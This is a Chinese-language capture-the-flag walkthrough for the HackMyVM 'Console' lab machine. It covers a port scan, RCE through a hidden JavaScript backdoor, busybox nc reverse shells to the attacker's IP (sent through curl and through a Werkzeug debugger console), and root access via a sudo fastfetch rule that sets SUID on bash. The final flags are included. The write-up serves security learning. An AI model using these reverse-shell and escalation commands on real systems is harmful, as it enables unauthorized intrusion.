![image-20251111212752041](http://7r1UMPHK.github.io/image/20251112092940738.webp)

> **靶机地址**: https://hackmyvm.eu/machines/machine.php?vm=Console
>
> **难度**: 中等
>
> **作者**: Sublarge

## 一、信息收集

### 1.1 主机发现

使用 `arp-scan` 对目标网段进行扫描，以发现存活主机，并确定其 IPv4 地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.135 08:00:27:d4:94:39       PCS Systemtechnik GmbH
...
```

根据扫描结果，确定目标主机的 IP 地址为 `192.168.205.135`。

同时，使用 `ping6` 发现目标的 IPv6 链路本地地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ping6 -I eth0 ff02::1
...
64 bytes from fe80::a00:27ff:fed4:9439%eth0: icmp_seq=1 ttl=64 time=2.07 ms
...
```

目标 IPv6 地址为 `fe80::a00:27ff:fed4:9439`。

### 1.2 端口扫描

使用 Nmap 对目标主机进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.135
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 20:45 CST
Nmap scan report for 192.168.205.135
Host is up (0.00013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
443/tcp  open     https
5000/tcp filtered upnp
MAC Address: 08:00:27:D4:94:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

扫描发现目标开放了 22 (SSH)，80 (HTTP)，443 (HTTPS) 和 5000 端口。

## 二、漏洞发现与利用

### 2.1 Web 服务枚举

访问 `http://192.168.205.135`，页面显示一个动态的命令行终端界面。

对 HTTPS 服务进行深入探测，发现其使用自签名证书，域名为 `hacker.maze-sec.hmv`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p443 -sC -sV 192.168.205.135
...
PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Apache httpd 2.4.62
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=hacker.maze-sec.hmv/organizationName=Maze-Sec...
...
```

将该域名与目标 IP 绑定到 `/etc/hosts` 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/hosts
# 添加以下行
192.168.205.135 hacker.maze-sec.hmv
```

访问 `https://hacker.maze-sec.hmv`，出现一个黑客模拟器界面。

![image-20251111205144990](http://7r1UMPHK.github.io/image/20251112092944079.webp)

### 2.2 RCE via JavaScript 后门

通过浏览器开发者工具审查网页加载的 JavaScript 文件，在 `hacker.js` 中发现一段可疑代码。

```javascript
document.addEventListener('keydown', function (e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'Z') {
        let cmd = prompt('请输入调试命令:');
        if (cmd) {
            let path = ['su', 'per', 'co', 'ool'].join('') + '.php';
            let param = ['cm', 'd='].join('');
            let url = './' + path + '?' + param + encodeURIComponent(cmd);
            // ...
        }
    }
});
```

代码表明，当用户按下 `Ctrl + Shift + Z` 组合键时，会弹出一个输入框，并将输入的内容作为 `cmd` 参数的值，请求 `supercoool.php` 文件。这显然是一个隐藏的后门。

使用 `curl` 直接利用这个后门执行 `id` 命令，确认存在远程代码执行（RCE）漏洞。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -k "https://hacker.maze-sec.hmv/supercoool.php?cmd=id"
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

### 2.3 获取初始 Shell

利用该 RCE 漏洞，执行 `busybox nc` 命令反弹一个 shell。首先在攻击机上监听 443 端口（其他端口处于能弹，没报错，卡死，貌似封端口了）。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 443
```

然后，通过 `curl` 发送包含反弹 shell payload 的请求。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -k "https://hacker.maze-sec.hmv/supercoool.php?cmd=busybox%20nc%20192%2E168%2E205%2E128%20443%20%2De%20%2Fbin%2Fbash"
```

成功接收到反弹 shell，当前用户为 `www-data`。

```bash
listening on [any] 443 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.135] 38776
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

使用`stty` 命令将该 shell 升级为功能完善的交互式 TTY。

```bash
script /dev/null -c bash
# 按下 Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

> 行列数计算
>
> stty -a|grep 'row'|awk -F'[ ;]+' '{print "stty "$4,$5,$6,$7}'

## 三、权限提升

### 3.1 www-data -> welcome

在 `/home` 目录下发现 `qaq` 和 `welcome` 两个用户。在 `welcome` 用户的家目录中，发现 `.viminfo` 文件，其所有者为 root。

```bash
www-data@Console:/home/welcome$ ls -al
...
-rw-r--r-- 1 root    root      19 May 16 10:48 .viminfo
-rw-r--r-- 1 root    root      44 May 17 06:01 user.txt
```

查看该文件内容，发现了一组凭证。

```bash
www-data@Console:/home/welcome$ cat .viminfo
welcome:welcome123
```

使用这组凭证 `welcome:welcome123` 成功切换到 `welcome` 用户。

```bash
www-data@Console:/home/welcome$ su welcome
Password: welcome123
welcome@Console:~$ id
uid=1002(welcome) gid=1002(welcome) groups=1002(welcome)
```

### 3.2 welcome -> qaq

检查 `welcome` 用户的 `sudo` 权限。

```bash
welcome@Console:~$ sudo -l
...
User welcome may run the following commands on Console:
    (qaq) PASSWD: /bin/cat /opt/flask-app/logs/flask.log
```

`welcome` 用户可以作为 `qaq` 用户免密执行 `cat` 命令读取 Flask 应用的日志。执行该命令。

```bash
welcome@Console:~$ sudo -u qaq /bin/cat /opt/flask-app/logs/flask.log
...
 * Debugger is active!
 * Debugger PIN: 872-793-870
...
```

日志中暴露了 Flask 调试器的 PIN 码 `872-793-870`。该 Flask 应用运行在 5000 端口。

为了从攻击机访问到目标上仅限本地访问的调试器，我们使用 SSH 进行端口转发。首先，将攻击机的 SSH 公钥写入 `welcome` 用户的 `authorized_keys` 文件中以便免密登录。

```bash
welcome@Console:~$ mkdir ~/.ssh
welcome@Console:~$ echo 'ssh-rsa AAAAB3...' > ~/.ssh/authorized_keys
```

在攻击机上，通过 SSH 登录并建立端口转发，将本地的 5000 端口映射到目标的 5000 端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh -L 0.0.0.0:5000:127.0.0.1:5000 welcome@192.168.205.135
```

现在访问攻击机的 `http://127.0.0.1:5000/console`，即可看到 Werkzeug 调试器控制台。

![image-20251111212113746](http://7r1UMPHK.github.io/image/20251112092948911.webp)

输入之前获取的 PIN `872-793-870`，进入交互式 Python 控制台。由于该 Flask 应用以 `qaq` 用户身份运行，我们在这里执行的代码也将拥有 `qaq` 权限。执行 Python 反弹 shell 命令。

```python
import os
os.system('busybox nc 192.168.205.128 443 -e /bin/bash')
```

在攻击机上再次监听 443 端口，成功接收到 `qaq` 用户的 shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.135] 43126
id
uid=1001(qaq) gid=1001(qaq) groups=1001(qaq)
```

### 3.3 qaq -> root

检查 `qaq` 用户的 `sudo` 权限。

```bash
qaq@Console:~$ sudo -l
...
User qaq may run the following commands on Console:
    (ALL) NOPASSWD: /usr/bin/fastfetch
```

`qaq` 用户可以作为任意用户免密执行 `fastfetch`。`fastfetch` 是一个系统信息查看工具，通过查阅其帮助文档，发现它允许通过参数执行自定义命令。

```bash
qaq@Console:~$ sudo /usr/bin/fastfetch -h
...
      --command-shell <str>                  Set the shell program to execute the command text
      --command-key <str>                    Set the module key to display
      --command-text <str>                   Set the command text to be executed
...
```

我们可以利用 `--command-shell` 和 `--command-text` 参数来执行任意命令。我们的提权思路是为 `/bin/bash` 添加 SUID 权限位。

```bash
qaq@Console:~$ sudo /usr/bin/fastfetch --structure 'command' --command-shell /bin/bash --command-text 'chmod +s /bin/bash'
```

命令执行成功后，检查 `/bin/bash` 的权限。

```bash
qaq@Console:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

可以看到 SUID 位已成功设置。现在，使用 `-p` 参数运行 `bash`，以继承 SUID 赋予的 root 权限。

```bash
qaq@Console:~$ bash -p
bash-5.0# id
uid=1001(qaq) gid=1001(qaq) euid=0(root) egid=0(root) groups=0(root),1001(qaq)
```

成功提升至 root 权限。

## 四、获取 Flag

提权成功后，读取 user 和 root 的 flag。

```bash
bash-5.0# cat /home/welcome/user.txt
flag{user-376760a7c739a606d4f8d8340bad4184}

bash-5.0# cat /root/r00t.txt
flag{root-009de5ebccb9fdecce2c4ac893bca6fa}
```

渗透测试完成。